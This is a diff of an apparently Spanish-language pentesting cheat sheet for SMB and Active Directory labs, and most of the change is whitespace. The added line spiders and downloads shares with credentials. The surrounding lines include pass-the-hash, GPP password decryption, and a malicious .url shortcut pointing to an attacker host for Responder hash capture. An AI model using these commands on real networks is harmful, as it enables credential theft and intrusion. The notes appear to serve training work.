@@ -7,6 +7,8 @@ netexec smb $IP
 
 ```bash
 crackmapexec smb $IP --shares
+nxc smb ips -u eturner -p passwd --shares -M spider_plus -o DOWNLOAD_FLAG=True  OUTPUT_FOLDER=.
+
 
 smbmap -H 10.10.10.175
 smbmap -H 10.10.10.175 -u "null"
@@ -36,7 +38,6 @@ gpp-decrypt cpassword
 smbclient.py -hashes ':2a572c5e5ffe107ca30f260b97843d94' Administrator@172.17.0.34
 ```
 
-
 ## Kerberos
 
 ```bash
@@ -57,7 +58,7 @@ mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,passwor
 umount /mnt/smbmounted
 ```
 
-## PERMISOS WRITE 
+## PERMISOS WRITE
 
 ```bash
 https://github.com/Greenwolf/ntlm_theft
@@ -70,7 +71,6 @@ prompt off
 mput * 
 ```
 
-
 - O si no probar
 ```bash
 [InternetShortcut]
@@ -80,4 +80,3 @@ IconFile=\\10.10.14.20\x\share.ico
 
 #Responder -I tun0 (aun con ligolo)
 ```
-
